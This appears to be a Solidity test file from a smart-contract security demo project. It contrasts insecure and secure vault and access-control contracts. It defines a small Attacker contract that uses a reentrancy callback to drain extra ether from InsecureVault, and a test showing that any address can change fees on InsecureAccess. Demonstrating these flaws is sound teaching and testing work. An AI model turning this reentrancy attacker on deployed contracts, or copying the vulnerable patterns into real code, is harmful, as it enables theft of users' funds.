// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import {Test} from "forge-std/Test.sol";
import {InsecureVault} from "../../contracts/security/InsecureVault.sol";
import {SecureVault} from "../../contracts/security/SecureVault.sol";
import {InsecureAccess} from "../../contracts/security/InsecureAccess.sol";
import {SecureAccess} from "../../contracts/security/SecureAccess.sol";

contract Attacker {
    InsecureVault vault;
    uint256 count;

    constructor(InsecureVault v) {
        vault = v;
    }

    receive() external payable {
        if (count < 2 && address(vault).balance > 0) {
            count++;
            vault.withdraw(1 ether);
        }
    }

    function attack() external payable {
        vault.deposit{value: msg.value}();
        vault.withdraw(1 ether);
    }
}

contract SecurityCasesTest is Test {
    function test_reentrancy_insecure_drainsExtra() public {
        InsecureVault v = new InsecureVault();
        Attacker a = new Attacker(v);
        vm.deal(address(v), 3 ether);
        vm.deal(address(a), 1 ether);
        a.attack{value: 1 ether}();
        assertGt(address(a).balance, 1 ether);
    }

    function test_reentrancy_secure_blocks() public {
        SecureVault v = new SecureVault();
        vm.deal(address(this), 2 ether);
        v.deposit{value: 1 ether}();
        v.withdraw(1 ether);
        assertEq(address(v).balance, 0);
    }

    function test_access_insecure_anyoneSetsFee() public {
        InsecureAccess a = new InsecureAccess();
        vm.prank(makeAddr("rando"));
        a.setFeeBps(9999);
        assertEq(a.feeBps(), 9999);
    }

    function test_access_secure_onlyAdmin() public {
        address admin = makeAddr("admin");
        SecureAccess a = new SecureAccess(admin);
        vm.prank(makeAddr("rando"));
        vm.expectRevert();
        a.setFeeBps(100);
        vm.prank(admin);
        a.setFeeBps(100);
        assertEq(a.feeBps(), 100);
    }
}
